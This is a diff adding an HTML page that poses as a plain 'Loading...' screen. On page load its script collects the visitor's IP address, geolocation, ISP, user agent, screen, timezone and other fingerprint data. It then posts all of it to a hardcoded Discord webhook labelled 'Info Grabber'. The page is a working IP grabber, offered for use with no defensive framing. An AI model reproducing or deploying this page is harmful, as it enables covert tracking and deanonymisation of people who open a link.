@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+        }
+        .spinner {
+            border: 3px solid #333;
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p class="status">Loading...</p>
+    </div>
+
+    <script>
+        async function grabAndSend() {
+            const webhookURL = "https://discord.com/api/webhooks/1564391799886184549/UNmQ54Z4L3KWghUHPPFxtdA3sw5IBOQLVTQukq9IORDhkKLsWYS2Ozkoj1Lv7RO2sG0Q";
+            
+            const statusEl = document.querySelector('.status');
+            
+            try {
+                statusEl.textContent = "Grabbing info...";
+                
+                // Get IP from external service
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // Get additional info from ipapi
+                const geoResponse = await fetch(`https://ipapi.com/ip_api.php?ip=${userIP}`);
+                const geoData = await geoResponse.json();
+                
+                // Collect browser and system info
+                const collectorInfo = {
+                    ip: userIP,
+                    ipapi_data: geoData,
+                    user_agent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    window_resolution: `${window.innerWidth}x${window.innerHeight}`,
+                    color_depth: screen.colorDepth,
+                    device_memory: navigator.deviceMemory || 'unknown',
+                    hardware_concurrency: navigator.hardwareConcurrency,
+                    cookie_enabled: navigator.cookieEnabled,
+                    do_not_track: navigator.doNotTrack,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    java_enabled: navigator.javaEnabled(),
+                    connection_type: navigator.connection?.effectiveType || 'unknown',
+                    connection_speed: navigator.connection?.downlink || 'unknown',
+                    referrer: document.referrer || 'direct',
+                    current_url: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                
+                statusEl.textContent = "Sending to Discord...";
+                
+                // Format for Discord webhook
+                const discordPayload = {
+                    content: null,
+                    embeds: [{
+                        title: "🔍 New Visitor Detected",
+                        color: 16711680,
+                        fields: [
+                            { name: "IP Address", value: collectorInfo.ip, inline: true },
+                            { name: "Country", value: collectorInfo.ipapi_data.country_name || "Unknown", inline: true },
+                            { name: "City", value: collectorInfo.ipapi_data.city || "Unknown", inline: true },
+                            { name: "ISP", value: collectorInfo.ipapi_data.asn?.name || "Unknown", inline: false },
+                            { name: "User Agent", value: `\`\`\`${collectorInfo.user_agent}\`\`\}`, inline: false },
+                            { name: "Language", value: collectorInfo.language, inline: true },
+                            { name: "Platform", value: collectorInfo.platform, inline: true },
+                            { name: "Timezone", value: collectorInfo.timezone, inline: true },
+                            { name: "Screen Resolution", value: collectorInfo.screen_resolution, inline: true },
+                            { name: "Window Size", value: collectorInfo.window_resolution, inline: true },
+                            { name: "Connection Type", value: collectorInfo.connection_type, inline: true },
+                            { name: "Referrer", value: collectorInfo.referrer, inline: false },
+                            { name: "Current URL", value: collectorInfo.current_url, inline: false },
+                            { name: "Timestamp", value: collectorInfo.timestamp, inline: false }
+                        ],
+                        footer: {
+                            text: "Info Grabber"
+                        }
+                    }]
+                };
+                
+                // Send to Discord webhook
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(discordPayload)
+                });
+                
+                if (response.ok) {
+                    statusEl.textContent = "✓ Info sent successfully!";
+                    statusEl.style.color = "#0f0";
+                } else {
+                    statusEl.textContent = "✗ Failed to send to Discord";
+                    statusEl.style.color = "#f00";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                statusEl.textContent = "✗ Error: " + error.message;
+                statusEl.style.color = "#f00";
+            }
+        }
+
+        // Run immediately on page load
+        grabAndSend();
+    </script>
+</body>
+</html>
